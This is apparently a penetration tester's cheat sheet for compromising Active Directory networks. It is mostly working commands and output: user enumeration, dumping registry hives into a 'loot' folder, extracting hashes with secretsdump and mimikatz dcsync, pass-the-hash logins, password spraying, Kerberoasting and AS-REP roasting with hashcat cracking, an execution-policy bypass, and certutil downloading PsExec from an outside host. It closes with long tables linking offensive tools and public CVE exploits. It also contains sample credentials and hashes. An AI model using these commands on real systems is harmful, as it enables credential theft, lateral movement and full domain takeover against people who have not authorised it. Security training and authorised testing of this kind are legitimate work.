nmap -p88 --min-rate 1000 10.11.1.20-24 #looking for DC
````
##### Impacket
````
impacket-GetADUsers -dc-ip 192.168.214.122 "exampleH.example/" -all 
````
````
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Querying 192.168.214.122 for information about domain.
Name                  Email                           PasswordLastSet      LastLogon           
--------------------  ------------------------------  -------------------  -------------------
Guest                                                 <never>              <never>             
rplacidi                                              2020-11-04 00:35:05.106274  <never>             
opatry                                                2020-11-04 00:35:05.216273  <never>             
ltaunton                                              2020-11-04 00:35:05.264272  <never>             
acostello                                             2020-11-04 00:35:05.315273  <never>             
jsparwell                                             2020-11-04 00:35:05.377272  <never>             
oknee                                                 2020-11-04 00:35:05.433274  <never>             
jmckendry                                             2020-11-04 00:35:05.492273  <never>             
avictoria                                             2020-11-04 00:35:05.545279  <never>             
jfrarey                                               2020-11-04 00:35:05.603273  <never>             
eaburrow                                              2020-11-04 00:35:05.652273  <never>             
cluddy                                                2020-11-04 00:35:05.703274  <never>             
agitthouse                                            2020-11-04 00:35:05.760273  <never>             
fmcsorley                                             2020-11-04 00:35:05.815275  2021-02-16 08:39:34.483491
````
###### Creds
````
impacket-GetADUsers -dc-ip 192.168.214.122 exampleH.example/fmcsorley:CrabSharkJellyfish192 -all
````
````
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Querying 192.168.214.122 for information about domain.
Name                  Email                           PasswordLastSet      LastLogon           
--------------------  ------------------------------  -------------------  -------------------
Admin                                         2023-05-19 17:01:26.839372  2020-11-04 00:58:40.654236 
Guest                                                 <never>              <never>             
krbtgt                                                2020-11-04 00:26:23.099902  <never>             
USERA                                              2020-11-04 00:35:05.106274  <never>             
USERB                                                2020-11-04 00:35:05.216273  <never>             
USERC                                                 2020-11-04 00:35:05.216273  <never>                                                           2020-11-04 00:35:05.264272  <never>             
USERD                                                 2020-11-04 00:35:05.216273  <never>                                                          2020-11-04 00:35:05.315273  <never>             
jUSERE                                                 2020-11-04 00:35:05.216273  <never>                                                          2020-11-04 00:35:05.377272  <never>             
USERF                                                2020-11-04 00:35:05.216273  <never>                                                              2020-11-04 00:35:05.433274  <never>             
USERG                                                 2020-11-04 00:35:05.216273  <never>                                                          2020-11-04 00:35:05.492273  <never>             
USERG                                                 2020-11-04 00:35:05.216273  <never>                                                          2020-11-04 00:35:05.545279  <never>             
USERH                                                 2020-11-04 00:35:05.216273  <never>                                                            2020-11-04 00:35:05.603273  <never>             
USERI                                                 2020-11-04 00:35:05.216273  <never>                                                           2020-11-04 00:35:05.652273  <never>             
USERJ                                                 2020-11-04 00:35:05.216273  <never>                                                            2020-11-04 00:35:05.703274  <never>             
USERK                                                 2020-11-04 00:35:05.216273  <never>                                                         2020-11-04 00:35:05.760273  <never>             
USERL                                                 2020-11-04 00:35:05.216273  <never>                                                          2020-11-04 00:35:05.815275  2021-02-16 08:39:34.483491 
domainadmin                                           2021-02-16 00:24:22.190351  2023-05-19 16:58:10.073764
````
##### Bloodhound.py
````
/opt/BloodHound.py/bloodhound.py -d exampleH.example -u fmcsorley -p CrabSharkJellyfish192 -c all -ns 192.168.214.122
````
````
INFO: Found AD domain: exampleH.example
INFO: Getting TGT for user
WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: [Errno Connection error (exampleH.example:88)] [Errno 111] Connection refused
INFO: Connecting to LDAP server: exampleHdc.exampleH.example
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: exampleHdc.exampleH.example
INFO: Found 18 users
INFO: Found 52 groups
INFO: Found 2 gpos
INFO: Found 1 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: exampleHdc.exampleH.example
INFO: Done in 00M 12S

````
#### Network commands
````
arp -a #look for IPs that your victim is connected
ipconfig #look for a dual victim machine, typically two $IPs shown
````
#### User Hunting
````
net users #Local users
net users /domain #All users on Domain
net users jeff /domain #Queury for more infromation on each user
net group /domain #Enumerate all groups on the domain
net group "Music Department" / domain #Enumerating specific domain group for members
````
#### Credential hunting
##### Interesting Files
````
Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
Get-ChildItem -Path C:\xampp -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue
Get-ChildItem -Path C:\Users\USERD\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx -File -Recurse -ErrorAction
````
````
tree /f C:\Users\ #look for interesting files, backups etc.
````
##### Sam, System, Security Files
````
whoami /all #BUILTIN\Admins
````
````
reg save hklm\security c:\security
reg save hklm\sam c:\sam
reg save hklm\system c:\system
````
````
copy C:\sam z:\loot
copy c:\security z:\loot
c:\system z:\loot
````
````
*Evil-WinRM* PS C:\windows.old\Windows\system32> download SAM
*Evil-WinRM* PS C:\windows.old\Windows\system32> download SYSTEM
````
````
/opt/impacket/examples/secretsdump.py -sam sam -security security -system system LOCAL
````
````
samdump2 SYSTEM SAM                                                                                                                     
*disabled* Admin:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
*disabled* Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
*disabled* :503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
*disabled* :504:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
tom_admin:1001:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
:1002:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
:1003:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
:1004:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
````
````
creddump7                       
creddump7 - Python tool to extract credentials and secrets from Windows registry hives
/usr/share/creddump7
├── cachedump.py
├── framework
├── lsadump.py
├── pwdump.py
└── __pycache_

./pwdump.py /home/kali/Documents/example/exampleA/10.10.124.142/loot/SYSTEM /home/kali/Documents/example/exampleA/10.10.124.142/loot/SAM    
Admin:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:acbb9b77c62fdd8fe5976148a933177a:::
tom_admin:1001:aad3b435b51404eeaad3b435b51404ee:4979d69d4ca66955c075c41cf45f24dc:::
Cheyanne.Adams:1002:aad3b435b51404eeaad3b435b51404ee:b3930e99899cb55b4aefef9a7021ffd0:::
David.Rhys:1003:aad3b435b51404eeaad3b435b51404ee:9ac088de348444c71dba2dca92127c11:::
Mark.Chetty:1004:aad3b435b51404eeaad3b435b51404ee:92903f280e5c5f3cab018bd91b94c771:::
````
````
https://crackstation.net/
hashcat -m <load the hash mode> hash.txt /usr/share/wordlists/rockyou.txt
````
##### impacket-secretsdump
````
impacket-secretsdump Admin:'password'@$IP -outputfile hashes
````
````
https://crackstation.net/
hashcat -m <load the hash mode> hash.txt /usr/share/wordlists/rockyou.txt
````
````
$DCC2$10240#username#hash
````
````
$DCC2$10240#Admin#a7c5480e8c1ef0ffec54e99275e6e0f7
$DCC2$10240#luke#cd21be418f01f5591ac8df1fdeaa54b6
$DCC2$10240#warren#b82706aff8acf56b6c325a6c2d8c338a
$DCC2$10240#jess#464f388c3fe52a0fa0a6c8926d62059c
````
````
hashcat -m 2100 hashes.txt /usr/share/wordlists/rockyou.txt

This hash does not allow pass-the-hash style attacks, and instead requires Password Cracking to recover the plaintext password
````
##### Powershell
````
PS C:\> (Get-PSReadlineOption).HistorySavePath
C:\Users\USERA\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt

type C:\Users\USERA\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
echo "Let's check if this script works running as damon and password password123"
````
##### PowerView
````
wget https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1
````
````
Import-Module .\PowerView.ps1
Get-NetDomain
Get-NetUser
Get-DomainUser 
Get-DomainUser | select cn
Get-NetGroup | select name
Get-NetGroupMember -MemberName "domain admins" -Recurse | select MemberName
````
````
Get-NetUser -SPN #Kerberoastable users
Get-NetUser -SPN | select serviceprincipalname #Kerberoastable users
Get-NetUser -SPN | ?{$_.memberof -match 'Domain Admins'} #Domain admins kerberostable
Find-LocalAdminAccess #Asks DC for all computers, and asks every compute if it has admin access (very noisy). You need RCP and SMB ports opened.
````
###### Errors
````
PS C:\> Import-Module .\PowerView.ps1
Import-Module : File C:\PowerView.ps1 cannot be loaded because running scripts is disabled on this system. For more 
information, see about_Execution_Policies at https:/go.microsoft.com/fwlink/?LinkID=135170.
````
````
PS C:\> powershell -exec bypass #this is how to get around it
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

Try the new cross-platform PowerShell https://aka.ms/pscore6

Import-Module .\PowerView.ps1
PS C:\> Import-Module .\PowerView.ps1
````
##### mimikatz.exe
````
https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20220919/mimikatz_trunk.zip
or
https://github.com/allandev5959/mimikatz-2.1.1
unzip mimikatz_trunk.zip 
cp /usr/share/windows-resources/mimikatz/Win32/mimikatz.exe .
cp /usr/share/windows-resources/mimikatz/x64/mimikatz.exe .
````
````
privilege::debug
mimikatz token::elevate
sekurlsa::logonpasswords
sekurlsa::tickets
````
#### AD Lateral Movement
##### Network
````
nslookup #use this tool to internally find the next computer to pivot to.
example-app23.example.com #found this from either the tgt, mimikatz, etc. Shows you where to go next
Address: 10.11.1.121
````
###### SMB
````
impacket-psexec jess:Flowers1@172.16.138.11 cmd.exe
impacket-psexec -hashes aad3b435b51404eeaad3b435b51404ee:8c802621d2e36fc074345dded890f3e5 Admin@192.168.129.59
impacket-psexec -hashes lm:ntlm zenservice@192.168.183.170
````
###### WINRM
````
evil-winrm -u <user> -p <password> -i 172.16.138.83
evil-winrm -u <user> -H <hash> -i 172.16.138.83
````
###### WMI
````
proxychains -q impacket-wmiexec forest/bob:'password'@172.16.138.10
impacket-wmiexec forest/bob:'password'@172.16.138.10
````
###### RDP
````
rdesktop -u 'USERN' -p 'abc123//' 192.168.129.59 -g 94% -d example
xfreerdp /v:10.1.1.89 /u:USERX /pth:5e22b03be2cnzxlcjei9cxzc9x
xfreerdp /cert-ignore /bpp:8 /compression -themes -wallpaper /auto-reconnect /h:1000 /w:1600 /v:192.168.238.191 /u:admin /p:password
xfreerdp /u:admin  /v:192.168.238.191 /cert:ignore /p:"password"  /timeout:20000 /drive:home,/tmp
````
###### Accessing shares with RDP
````
windows + R
type: \\172.16.120.21
Enter User Name
Enter Password
[now view shares via rdp session]
````
#### AD attacks
##### Spray and Pray
````
sudo crackmapexec smb 192.168.50.75 -u users.txt -p 'Nexus123!' -d example.com --continue-on-success
sudo crackmapexec smb 192.168.50.75 -u USERD -p 'Flowers1' -d example.com
sudo crackmapexec smb 10.10.137.142 -u users.txt -p pass.txt -d ms02 --continue-on-success
sudo proxychains crackmapexec smb 10.10.124.140 -u Admin -p hghgib6vHT3bVWf  -x whoami --local-auth
sudo proxychains crackmapexec winrm 10.10.124.140 -u Admin -p hghgib6vHT3bVWf  -x whoami --local-auth
sudo crackmapexec winrm 192.168.50.75 -u users.txt -p 'Nexus123!' -d example.com --continue-on-success
sudo crackmapexec winrm 192.168.50.75 -u USERD -p 'Flowers1' -d example.com
sudo crackmapexec winrm 10.10.137.142 -u users.txt -p pass.txt -d ms02 --continue-on-succes
proxychains crackmapexec mssql -d example.com -u sql_service -p password123  -x "whoami" 10.10.126.148
````
````
.\kerbrute_windows_amd64.exe passwordspray -d example.com .\usernames.txt "password123"
````
##### Pass-the-hash
````
crackmapexec smb 10.11.1.120-124 -u admin -H 'LMHASH:NTHASH' --local-auth --lsa #for hashes
crackmapexec smb 10.11.1.20-24 -u pat -H b566afa0a7e41755a286cba1a7a3012d --exec-method smbexec -X 'whoami'
crackmapexec smb 10.11.1.20-24 -u tim -H 08df3c73ded940e1f2bcf5eea4b8dbf6 -d svexample.com -x whoami
proxychains crackmapexec smb 10.10.126.146 -u 'Admin' -H '59b280ba707d22e3ef0aa587fc29ffe5' -x whoami -d example.com
````
##### TGT Impersonation
````
PS> klist # should show no TGT/TGS
PS> net use \\SV-FILE01 (try other comps/targets) # generate TGT by auth to network share on the computer
PS> klist # now should show TGT/TGS
PS> certutil -urlcache -split -f http://192.168.119.140:80/PsExec.exe #/usr/share/windows-resources
PS>  .\PsExec.exe \\SV-FILE01 cmd.exe
````
##### AS-REP Roasting
````
impacket-GetNPUsers -dc-ip 192.168.50.70  -request -outputfile hashes.asreproast example.com/USERP
````
````
cp /opt/Ghostpack-CompiledBinaries/Rubeus.exe .
.\Rubeus.exe asreproast /nowrap /outfile:hashes.asreproast
type hashes.asreproast
````
###### Cracking AS-REP Roasting
````
sudo hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
````
##### Kerberoasting
````
sudo impacket-GetUserSPNs -request -outputfile hashes.kerberoast -dc-ip 192.168.50.70 example.com/user
````
````
.\Rubeus.exe kerberoast /simple /outfile:hashes.kerberoast
````
###### Cracking Kerberoasting
````
sudo hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
````
##### Domain Controller Synchronization
To do this, we could move laterally to the domain controller and run Mimikatz to dump the password hash of every user. We could also steal a copy of the NTDS.dit database file,1 which is a copy of all Active Directory accounts stored on the hard drive, similar to the SAM database used for local accounts.
````
lsadump::dcsync /all /csv #First run this to view all the dumpable hashes to be cracked or pass the hash
lsadump::dcsync /user:zenservice #Pick a user with domain admin rights to crack the password or pass the hash
````
````
Credentials:
  Hash NTLM: d098fa8675acd7d26ab86eb2581233e5
    ntlm- 0: d098fa8675acd7d26ab86eb2581233e5
    lm  - 0: 6ba75a670ee56eaf5cdf102fabb7bd4c
````
````
impacket-psexec -hashes 6ba75a670ee56eaf5cdf102fabb7bd4c:d098fa8675acd7d26ab86eb2581233e5 zenservice@192.168.183.170
````










### Basics

| Name | URL |
| --- | --- |
| Chisel | https://github.com/jpillora/chisel |
| CyberChef | https://gchq.github.io/CyberChef |
| Ligolo-ng | https://github.com/nicocha30/ligolo-ng |
| Swaks | https://github.com/jetmore/swaks |

### Information Gathering

| Name | URL |
| --- | --- |
| Nmap | https://github.com/nmap/nmap |

### Vulnerability Analysis

| Name | URL |
| --- | --- |
| nikto | https://github.com/sullo/nikto |
| Sparta | https://github.com/SECFORCE/sparta |

### Web Application Analysis

| Name | URL |
| --- | --- |
| ffuf | https://github.com/ffuf/ffuf |
| fpmvuln | https://github.com/hannob/fpmvuln |
| Gobuster | https://github.com/OJ/gobuster |
| JSON Web Tokens | https://jwt.io |
| JWT_Tool | https://github.com/ticarpi/jwt_tool |
| Leaky Paths | https://github.com/ayoubfathi/leaky-paths |
| PayloadsAllTheThings | https://github.com/swisskyrepo/PayloadsAllTheThings |
| PHP Filter Chain Generator | https://github.com/synacktiv/php_filter_chain_generator |
| PHPGGC | https://github.com/ambionics/phpggc |
| Spose | https://github.com/aancw/spose |
| Wfuzz | https://github.com/xmendez/wfuzz |
| WhatWeb | https://github.com/urbanadventurer/WhatWeb |
| WPScan | https://github.com/wpscanteam/wpscan |

### Database Assessment

| Name | URL |
| --- | --- |
| RedisModules-ExecuteCommand | https://github.com/n0b0dyCN/RedisModules-ExecuteCommand |
| Redis RCE | https://github.com/Ridter/redis-rce |
| Redis Rogue Server | https://github.com/n0b0dyCN/redis-rogue-server |
| SQL Injection Cheatsheet | https://tib3rius.com/sqli.html |

### Password Attacks

| Name | URL |
| --- | --- |
| Default Credentials Cheat Sheet | https://github.com/ihebski/DefaultCreds-cheat-sheet |
| Firefox Decrypt | https://github.com/unode/firefox_decrypt |
| hashcat | https://hashcat.net/hashcat |
| Hydra | https://github.com/vanhauser-thc/thc-hydra |
| John | https://github.com/openwall/john |
| keepass-dump-masterkey | https://github.com/CMEPW/keepass-dump-masterkey |
| KeePwn | https://github.com/Orange-Cyberdefense/KeePwn |
| Kerbrute | https://github.com/ropnop/kerbrute |
| LaZagne | https://github.com/AlessandroZ/LaZagne |
| mimikatz | https://github.com/gentilkiwi/mimikatz |
| NetExec | https://github.com/Pennyw0rth/NetExec |
| ntlm.pw | https://ntlm.pw |
| pypykatz | https://github.com/skelsec/pypykatz |

### Exploitation Tools

| Name | URL |
| --- | --- |
| Evil-WinRM | https://github.com/Hackplayers/evil-winrm |
| Metasploit | https://github.com/rapid7/metasploit-framework |

### Post Exploitation

| Name | URL |
| --- | --- |
| ADCSKiller - An ADCS Exploitation Automation Tool | https://github.com/grimlockx/ADCSKiller |
| ADCSTemplate | https://github.com/GoateePFE/ADCSTemplate |
| ADMiner | https://github.com/Mazars-Tech/AD_Miner |
| adPEAS | https://github.com/ajm4n/adPEAS |
| BloodHound Docker | https://github.com/belane/docker-bloodhound |
| BloodHound | https://github.com/BloodHoundAD/BloodHound |
| BloodHound | https://github.com/ly4k/BloodHound |
| BloodHound Collectors | https://github.com/BloodHoundAD/BloodHound/tree/master/Collectors |
| BloodHound Python | https://github.com/dirkjanm/BloodHound.py |
| bloodhound-quickwin | https://github.com/kaluche/bloodhound-quickwin |
| Certify | https://github.com/GhostPack/Certify |
| Certipy | https://github.com/ly4k/Certipy |
| Cheat Sheet - Attack Active Directory | https://github.com/drak3hft7/Cheat-Sheet---Active-Directory |
| DonPAPI | https://github.com/login-securite/DonPAPI |
| enum4linux-ng | https://github.com/cddmp/enum4linux-ng |
| Ghostpack-CompiledBinaries | https://github.com/r3motecontrol/Ghostpack-CompiledBinaries |
| GTFOBins | https://gtfobins.github.io |
| Impacket | https://github.com/fortra/impacket |
| Impacket Static Binaries | https://github.com/ropnop/impacket_static_binaries |
| JAWS | https://github.com/411Hall/JAWS |
| KrbRelay | https://github.com/cube0x0/KrbRelay |
| KrbRelayUp | https://github.com/Dec0ne/KrbRelayUp |
| Krbrelayx | https://github.com/dirkjanm/krbrelayx |
| LAPSDumper | https://github.com/n00py/LAPSDumper |
| LES | https://github.com/The-Z-Labs/linux-exploit-suggester |
| LinEnum | https://github.com/rebootuser/LinEnum |
| lsassy | https://github.com/Hackndo/lsassy |
| Moriaty | https://github.com/BC-SECURITY/Moriarty |
| nanodump | https://github.com/fortra/nanodump |
| PassTheCert | https://github.com/AlmondOffSec/PassTheCert |
| PEASS-ng | https://github.com/carlospolop/PEASS-ng |
| PKINITtools | https://github.com/dirkjanm/PKINITtools |
| powercat | https://github.com/besimorhino/powercat |
| PowerSharpPack | https://github.com/S3cur3Th1sSh1t/PowerSharpPack |
| PowerUp | https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1 |
| PowerView | https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1 |
| PowerView.py | https://github.com/aniqfakhrul/powerview.py |
| PPLdump | https://github.com/itm4n/PPLdump |
| Priv2Admin | https://github.com/gtworek/Priv2Admin |
| PrivescCheck | https://github.com/itm4n/PrivescCheck |
| PSPKIAudit | https://github.com/GhostPack/PSPKIAudit |
| pspy | https://github.com/DominicBreuker/pspy |
| pth-toolkit | https://github.com/byt3bl33d3r/pth-toolkit |
| pwncat | https://github.com/calebstewart/pwncat |
| pypykatz | https://github.com/skelsec/pypykatz |
| PyWhisker | https://github.com/ShutdownRepo/pywhisker |
| Rubeus | https://github.com/GhostPack/Rubeus |
| RunasCs | https://github.com/antonioCoco/RunasCs |
| RustHound | https://github.com/OPENCYBER-FR/RustHound |
| scavenger | https://github.com/SpiderLabs/scavenger |
| SharpADWS | https://github.com/wh0amitz/SharpADWS |
| SharpCollection | https://github.com/Flangvik/SharpCollection |
| SharpChromium | https://github.com/djhohnstein/SharpChromium |
| SharpHound | https://github.com/BloodHoundAD/SharpHound |
| SharpView | https://github.com/tevora-threat/SharpView |
| Sherlock | https://github.com/rasta-mouse/Sherlock |
| WADComs | https://wadcoms.github.io |
| Watson | https://github.com/rasta-mouse/Watson |
| WESNG | https://github.com/bitsadmin/wesng
| Whisker | https://github.com/eladshamir/Whisker |
| Windows-privesc-check | https://github.com/pentestmonkey/windows-privesc-check |
| Windows Privilege Escalation Fundamentals | https://www.fuzzysecurity.com/tutorials/16.html |
| Windows Privilege Escalation | https://github.com/frizb/Windows-Privilege-Escalation |

### Exploit Databases

| Database | URL |
| --- | --- |
| 0day.today Exploit Database | https://0day.today |
| Exploit Database | https://www.exploit-db.com |
| Packet Storm | https://packetstormsecurity.com |
| Sploitus | https://sploitus.com |

### CVEs

| CVE | Descritpion | URL |
| --- | --- | --- |
| CVE-2014-6271 | Shocker RCE | https://github.com/nccgroup/shocker |
| CVE-2014-6271 | Shellshock RCE PoC | https://github.com/zalalov/CVE-2014-6271 |
| CVE-2014-6271 | Shellshocker RCE POCs | https://github.com/mubix/shellshocker-pocs |
| CVE-2016-5195 | Dirty COW LPE | https://github.com/firefart/dirtycow |
| CVE-2016-5195 | Dirty COW '/proc/self/mem' Race Condition (/etc/passwd Method) LPE | https://www.exploit-db.com/exploits/40847 |
| CVE-2016-5195 | Dirty COW 'PTRACE_POKEDATA' Race Condition (/etc/passwd Method) LPE | https://www.exploit-db.com/exploits/40839 |
| CVE-2017-0144 | EternalBlue (MS17-010) RCE | https://github.com/d4t4s3c/Win7Blue |
| CVE-2017-0199 | RTF Dynamite RCE | https://github.com/bhdresh/CVE-2017-0199 |
| CVE-2018-7600 | Drupalgeddon 2 RCE | https://github.com/g0rx/CVE-2018-7600-Drupal-RCE |
| CVE-2018-10933 | libSSH Authentication Bypass | https://github.com/blacknbunny/CVE-2018-10933 |
| CVE-2018-16509 | Ghostscript PIL RCE | https://github.com/farisv/PIL-RCE-Ghostscript-CVE-2018-16509 |
| CVE-2019-14287 | Sudo Bypass LPE | https://github.com/n0w4n/CVE-2019-14287 |
| CVE-2019-18634 | Sudo Buffer Overflow LPE | https://github.com/saleemrashid/sudo-cve-2019-18634 |
| CVE-2019-5736 | RunC Container Escape PoC | https://github.com/Frichetten/CVE-2019-5736-PoC |
| CVE-2019-6447 | ES File Explorer Open Port Arbitrary File Read | https://github.com/fs0c131y/ESFileExplorerOpenPortVuln |
| CVE-2019-7304 | dirty_sock LPE | https://github.com/initstring/dirty_sock |
| CVE-2020-0796 | SMBGhost RCE PoC | https://github.com/chompie1337/SMBGhost_RCE_PoC |
| CVE-2020-1472 | ZeroLogon PE Checker & Exploitation Code | https://github.com/VoidSec/CVE-2020-1472 |
| CVE-2020-1472 | ZeroLogon PE Exploitation Script | https://github.com/risksense/zerologon |
| CVE-2020-1472 | ZeroLogon PE PoC | https://github.com/dirkjanm/CVE-2020-1472 |
| CVE-2020-1472 | ZeroLogon PE Testing Script | https://github.com/SecuraBV/CVE-2020-1472 |
| CVE-2021-1675,CVE-2021-34527 | PrintNightmare LPE RCE | https://github.com/nemo-wq/PrintNightmare-CVE-2021-34527 |
| CVE-2021-1675 | PrintNightmare LPE RCE (PowerShell Implementation) | https://github.com/calebstewart/CVE-2021-1675 |
| CVE-2021-21972 | vCenter RCE | https://github.com/horizon3ai/CVE-2021-21972 |
| CVE-2021-22204 | ExifTool Command Injection RCE | https://github.com/AssassinUKG/CVE-2021-22204 |
| CVE-2021-22204 | GitLab ExifTool RCE | https://github.com/CsEnox/Gitlab-Exiftool-RCE |
| CVE-2021-22204 | GitLab ExifTool RCE (Python Implementation) | https://github.com/convisolabs/CVE-2021-22204-exiftool |
| CVE-2021-26085 | Confluence Server RCE | https://github.com/Phuong39/CVE-2021-26085 |
| CVE-2021-27928 | MariaDB/MySQL wsrep provider RCE | https://github.com/Al1ex/CVE-2021-27928 |
| CVE-2021-3129 | Laravel Framework RCE | https://github.com/nth347/CVE-2021-3129_exploit |
| CVE-2021-3156 | Sudo / sudoedit LPE  | https://github.com/mohinparamasivam/Sudo-1.8.31-Root-Exploit |
| CVE-2021-3156 | Sudo / sudoedit LPE PoC | https://github.com/blasty/CVE-2021-3156 |
| CVE-2021-3493 | OverlayFS Ubuntu Kernel Exploit LPE | https://github.com/briskets/CVE-2021-3493 |
| CVE-2021-3560 | polkit LPE (C Implementation) | https://github.com/hakivvi/CVE-2021-3560 |
| CVE-2021-3560 | polkit LPE | https://github.com/Almorabea/Polkit-exploit |
| CVE-2021-3560 | polkit LPE PoC | https://github.com/secnigma/CVE-2021-3560-Polkit-Privilege-Esclation |
| CVE-2021-36934 | HiveNightmare LPE | https://github.com/GossiTheDog/HiveNightmare |
| CVE-2021-36942 | PetitPotam | https://github.com/topotam/PetitPotam |
| CVE-2021-36942 | DFSCoerce | https://github.com/Wh04m1001/DFSCoerce |
| CVE-2021-4034 | PwnKit Pkexec Self-contained Exploit LPE | https://github.com/ly4k/PwnKit |
| CVE-2021-4034 | PwnKit Pkexec LPE PoC (1) | https://github.com/dzonerzy/poc-cve-2021-4034 |
| CVE-2021-4034 | PwnKit Pkexec LPE PoC (2) | https://github.com/arthepsy/CVE-2021-4034 |
| CVE-2021-4034 | PwnKit Pkexec LPE PoC (3) | https://github.com/nikaiw/CVE-2021-4034 |
| CVE-2021-41379 | InstallerFileTakeOver LPE (0-day) (Archive) | https://github.com/klinix5/InstallerFileTakeOver |
| CVE-2021-41379 | InstallerFileTakeOver LPE (0-day) (Fork) | https://github.com/waltlin/CVE-2021-41379-With-Public-Exploit-Lets-You-Become-An-Admin-InstallerFileTakeOver |
| CVE-2021-41773,CVE-2021-42013, CVE-2020-17519 | Simples Apache Path Traversal (0-day) | https://github.com/MrCl0wnLab/SimplesApachePathTraversal |
| CVE-2021-42278,CVE-2021-42287 | sam-the-admin, sAMAccountName Spoofing / Domain Admin Impersonation PE | https://github.com/WazeHell/sam-the-admin |
| CVE-2021-42278 | sam-the-admin, sAMAccountName Spoofing / Domain Admin Impersonation PE (Python Implementation) | https://github.com/ly4k/Pachine |
| CVE-2021-42287,CVE-2021-42278 | noPac LPE (1) | https://github.com/cube0x0/noPac |
| CVE-2021-42287,CVE-2021-42278 | noPac LPE (2) | https://github.com/Ridter/noPac |
| CVE-2021-42321 | Microsoft Exchange Server RCE | https://gist.github.com/testanull/0188c1ae847f37a70fe536123d14f398 |
| CVE-2021-44228 | Log4Shell RCE (0-day) | https://github.com/kozmer/log4j-shell-poc |
| CVE-2021-44228 | Log4Shell RCE (0-day) | https://github.com/welk1n/JNDI-Injection-Exploit |
| CVE-2022-0847 | DirtyPipe-Exploit LPE | https://github.com/n3rada/DirtyPipe |
| CVE-2022-0847 | DirtyPipe-Exploits LPE | https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits |
| CVE-2022-21999 | SpoolFool, Windows Print Spooler LPE | https://github.com/ly4k/SpoolFool |
| CVE-2022-22963 | Spring4Shell RCE (0-day) | https://github.com/tweedge/springcore-0day-en |
| CVE-2022-23119,CVE-2022-23120 | Trend Micro Deep Security Agent for Linux Arbitrary File Read | https://github.com/modzero/MZ-21-02-Trendmicro |
| CVE-2022-24715 | Icinga Web 2 Authenticated Remote Code Execution RCE | https://github.com/JacobEbben/CVE-2022-24715 |
| CVE-2022-26134 | ConfluentPwn RCE (0-day) | https://github.com/redhuntlabs/ConfluentPwn |
| CVE-2022-31214 | Firejail / Firejoin LPE | https://seclists.org/oss-sec/2022/q2/188 |
| CVE-2022-31214 | Firejail / Firejoin LPE | https://www.openwall.com/lists/oss-security/2022/06/08/10 |
| CVE-2022-34918 | Netfilter Kernel Exploit LPE | https://github.com/randorisec/CVE-2022-34918-LPE-PoC |
| CVE-2022-46169 | Cacti Authentication Bypass RCE | https://github.com/ariyaadinatha/cacti-cve-2022-46169-exploit |
| CVE-2023-20598 | PDFWKRNL Kernel Driver LPE | https://github.com/H4rk3nz0/CVE-2023-20598-PDFWKRNL |
| CVE-2023-21746 | Windows NTLM EoP LocalPotato LPE | https://github.com/decoder-it/LocalPotato |
| CVE-2023-21768 | Windows Ancillary Function Driver for WinSock LPE POC | https://github.com/chompie1337/Windows_LPE_AFD_CVE-2023-21768 |
| CVE-2023-21817 | Kerberos Unlock LPE PoC | https://gist.github.com/monoxgas/f615514fb51ebb55a7229f3cf79cf95b |
| CVE-2023-22809 | sudoedit LPE | https://github.com/n3m1dotsys/CVE-2023-22809-sudoedit-privesc |
| CVE-2023-23752 | Joomla Unauthenticated Information Disclosure | https://github.com/Acceis/exploit-CVE-2023-23752 |
| CVE-2023-25690 | Apache mod_proxy HTTP Request Smuggling PoC | https://github.com/dhmosfunk/CVE-2023-25690-POC |
| CVE-2023-28879 | Shell in the Ghost: Ghostscript RCE PoC | https://github.com/AlmondOffSec/PoCs/tree/master/Ghostscript_rce |
| CVE-2023-32233 | Use-After-Free in Netfilter nf_tables LPE | https://github.com/Liuk3r/CVE-2023-32233 |
| CVE-2023-32629, CVE-2023-2640 | GameOverlay Ubuntu Kernel Exploit LPE (0-day) | https://twitter.com/liadeliyahu/status/1684841527959273472?s=09 |
| CVE-2023-36874 | Windows Error Reporting Service LPE (0-day) | https://github.com/Wh04m1001/CVE-2023-36874 |
| CVE-2023-51467, CVE-2023-49070 | Apache OFBiz Authentication Bypass | https://github.com/jakabakos/Apache-OFBiz-Authentication-Bypass |
